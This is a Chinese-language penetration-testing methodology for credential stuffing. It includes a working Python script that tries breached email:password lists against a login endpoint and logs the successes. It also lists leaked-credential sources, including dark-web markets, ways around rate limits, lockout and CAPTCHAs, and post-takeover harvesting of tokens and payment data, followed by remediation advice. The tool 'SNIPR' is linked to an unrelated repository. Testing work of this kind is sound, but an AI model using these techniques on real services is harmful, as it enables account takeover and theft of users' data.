# 凭证填充攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的凭证填充攻击检测和利用流程。

## 1.2 适用范围

本文档适用于所有存在用户认证机制的 Web 应用和 API 接口。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

凭证填充（Credential Stuffing）是指攻击者使用从其他数据泄露中获取的用户名/密码组合，尝试登录目标系统。

**本质问题**：
- 用户密码重用
- 缺少多因素认证
- 缺少异常登录检测

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-308 | 使用单因素认证 |
| CWE-521 | 弱密码要求 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 风险点 | 潜在危害 |
|---------|-------|---------|
| 用户登录 | 密码重用 | 账户接管 |
| API 认证 | Token 泄露 | 未授权访问 |
| 移动应用 | 凭证存储 | 凭证窃取 |
| SSO 系统 | 单点登录 | 多系统沦陷 |

## 2.3 漏洞发现方法

### 2.3.1 泄露凭证收集

```
常见泄露源：
- Have I Been Pwned
- DeHashed
- 暗网市场
- 公开的数据泄露

格式：
username:password
email:password
```

### 2.3.2 自动化测试工具

```bash
# 使用 SNIPR
git clone https://github.com/byt3bl33d3r/SprayingToolkit

# 使用 OpenBullet
# 图形化凭证填充工具

# 自定义脚本
python credential_stuffing.py \
    --target https://target.com/login \
    --creds breached_credentials.txt
```

### 2.3.3 密码喷洒

```bash
# 使用少量常见密码尝试大量用户
# 避免触发账户锁定

常见密码：
- Winter2025
- Password1
- Welcome1
- 123456
- 公司名 + 年份
```

## 2.4 漏洞利用方法

### 2.4.1 账户接管

```python
# 自动化登录脚本
import requests

def stuff_credentials(creds_file, target_url):
    with open(creds_file, 'r') as f:
        for line in f:
            email, password = line.strip().split(':')
            
            response = requests.post(target_url, json={
                'email': email,
                'password': password
            })
            
            if 'success' in response.text:
                print(f"[+] Success: {email}:{password}")
                # 记录成功的凭证
                with open('success.txt', 'a') as s:
                    s.write(f"{email}:{password}\n")
```

### 2.4.2 会话维持

```bash
# 成功登录后：
# 1. 保存 Session Cookie
# 2. 保存 Refresh Token
# 3. 保存 API Token

# 用于后续访问
```

### 2.4.3 敏感数据收集

```bash
# 登录成功后：
# 1. 获取个人资料
# 2. 获取订单历史
# 3. 获取支付信息
# 4. 获取关联账户
```

## 2.5 漏洞利用绕过方法

### 2.5.1 速率限制绕过

```bash
# 使用代理池
# 每个 IP 低于阈值

# 慢速攻击
# 请求间添加延迟

# 分布式攻击
# 多个来源同时攻击
```

### 2.5.2 账户锁定绕过

```bash
# 密码喷洒
# 每个账户尝试 1-2 个密码

# 用户名变体
# admin, admin@company.com, DOMAIN\admin
```

### 2.5.3 验证码绕过

```bash
# 使用打码平台
# 使用 OCR 识别
# 寻找未启用验证码的端点
```

---

# 第三部分：附录

## 3.1 凭证填充测试检查清单

```
□ 收集泄露凭证
□ 测试凭证有效性
□ 检测速率限制
□ 检测账户锁定
□ 检测 MFA
□ 检测异常登录
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| SNIPR | 凭证填充 | https://github.com/byt3bl33d3r/SprayingToolkit |
| OpenBullet | 图形化工具 | https://openbullet.dev/ |
| Burp Suite | 手动测试 | https://portswigger.net/burp |

## 3.3 修复建议

1. **多因素认证** - 启用 MFA
2. **密码策略** - 禁止弱密码
3. **速率限制** - 限制登录尝试
4. **异常检测** - 监控异常登录
5. **凭证检查** - 对照泄露密码库

---

**参考资源**：
- [OWASP Credential Stuffing](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html)
- [Have I Been Pwned](https://haveibeenpwned.com/)
